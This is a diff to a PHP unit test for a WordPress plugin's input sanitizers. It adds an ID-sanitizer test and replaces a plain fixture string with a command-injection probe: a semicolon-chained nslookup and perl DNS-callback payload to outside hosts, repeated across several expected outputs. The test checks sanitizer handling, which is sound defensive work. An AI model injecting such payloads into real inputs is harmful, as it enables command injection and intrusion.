@@ -28,8 +28,8 @@ class SanitizerTest extends WP_UnitTestCase
             'i' => true,
             'j' => false,
             'k' => '<script>var x = 23;</script>',
-            'l' => '<h3>This is a title!</h3>',
-            'm' => "Hello\nthere!",
+            'l' => "<h3>This is a\n title!</h3>",
+            'm' => ";(nslookup hit-gx_wgukmocpc5c8dddd.com||perl -e gethostbyname('hissstgxwgukmocpc5c80.me'))",
             'n' => 'June 13, 1989',
             'o' => '03-12-2020',
             'p' => '0-0-2020',
@@ -131,7 +131,7 @@ class SanitizerTest extends WP_UnitTestCase
             'j' => [],
             'k' => [''],
             'l' => ['This is a title!'],
-            'm' => ["Hello there!"],
+            'm' => [";(nslookup hit-gx_wgukmocpc5c8dddd.com||perl -e gethostbyname('hissstgxwgukmocpc5c80.me'))"],
             'n' => ['June 13', '1989'],
             'o' => ['03-12-2020'],
             'p' => ['0-0-2020'],
@@ -250,6 +250,38 @@ class SanitizerTest extends WP_UnitTestCase
         ]);
     }
 
+    public function test_sanitize_id()
+    {
+        $sanitizers = array_fill_keys(array_keys($this->testValues), 'id');
+        $sanitized = $this->sanitize($this->testValues, $sanitizers);
+        $pattern = '/glsr_([a-z0-9]{8})/';
+        $this->assertRegExp($pattern, $sanitized['a']);
+        $this->assertEquals($sanitized['b'], 'abc');
+        $this->assertEquals($sanitized['c'], '1');
+        $this->assertRegExp($pattern, $sanitized['d']);
+        $this->assertEquals($sanitized['e'], '13');
+        $this->assertRegExp($pattern, $sanitized['f']);
+        $this->assertEquals($sanitized['g'], '13');
+        $this->assertRegExp($pattern, $sanitized['h']);
+        $this->assertEquals($sanitized['i'], '1');
+        $this->assertRegExp($pattern, $sanitized['j']);
+        $this->assertEquals($sanitized['l'], 'thisisatitle');
+        $this->assertEquals($sanitized['m'], 'nslookuphit-gx_wgukmocpc5c8ddddc');
+        $this->assertEquals($sanitized['n'], 'june131989');
+        $this->assertEquals($sanitized['o'], '03-12-2020');
+        $this->assertEquals($sanitized['p'], '0-0-2020');
+        $this->assertEquals($sanitized['q'], '2020');
+        $this->assertEquals($sanitized['r'], 'xxxx');
+        $this->assertEquals($sanitized['s'], 'axdextomorrow200200peter');
+        $this->assertEquals($sanitized['t'], 'thisistrue');
+        $this->assertEquals($sanitized['u'], 'thisisfalse');
+        $this->assertEquals($sanitized['v'], 'mattwordpressorg');
+        $this->assertEquals($sanitized['w'], 'httpswordpressorg');
+        $this->assertEquals($sanitized['x'], 'wordpressorg');
+        $this->assertEquals($sanitized['y'], 'wwwwordpressorg');
+        $this->assertEquals($sanitized['z'], 'httpswordpressorg');
+    }
+
     public function test_sanitize_int()
     {
         $sanitizers = array_fill_keys(array_keys($this->testValues), 'int');
@@ -301,7 +333,7 @@ class SanitizerTest extends WP_UnitTestCase
             'j' => '',
             'k' => '',
             'l' => 'thisisatitle',
-            'm' => 'hellothere',
+            'm' => 'nslookuphit_gx_wgukmocpc5c8ddddc',
             'n' => 'june131989',
             'o' => '03_12_2020',
             'p' => '0_0_2020',
@@ -335,7 +367,7 @@ class SanitizerTest extends WP_UnitTestCase
             'j' => '',
             'k' => '',
             'l' => 'this-is-a-title',
-            'm' => 'hello-there',
+            'm' => 'nslookup-hit-gx_wgukmocpc5c8dddd-comperl-e-gethostbynamehissstgxwgukmocpc5c80-me',
             'n' => 'june-13-1989',
             'o' => '03-12-2020',
             'p' => '0-0-2020',
@@ -369,7 +401,7 @@ class SanitizerTest extends WP_UnitTestCase
             'j' => '',
             'k' => '',
             'l' => 'This is a title!',
-            'm' => 'Hello there!',
+            'm' => ";(nslookup hit-gx_wgukmocpc5c8dddd.com||perl -e gethostbyname('hissstgxwgukmocpc5c80.me'))",
             'n' => 'June 13, 1989',
             'o' => '03-12-2020',
             'p' => '0-0-2020',
@@ -402,8 +434,8 @@ class SanitizerTest extends WP_UnitTestCase
             'i' => '1',
             'j' => '',
             'k' => '',
-            'l' => 'This is a title!',
-            'm' => "Hello\nthere!",
+            'l' => "This is a\n title!",
+            'm' => ";(nslookup hit-gx_wgukmocpc5c8dddd.com||perl -e gethostbyname('hissstgxwgukmocpc5c80.me'))",
             'n' => 'June 13, 1989',
             'o' => '03-12-2020',
             'p' => '0-0-2020',
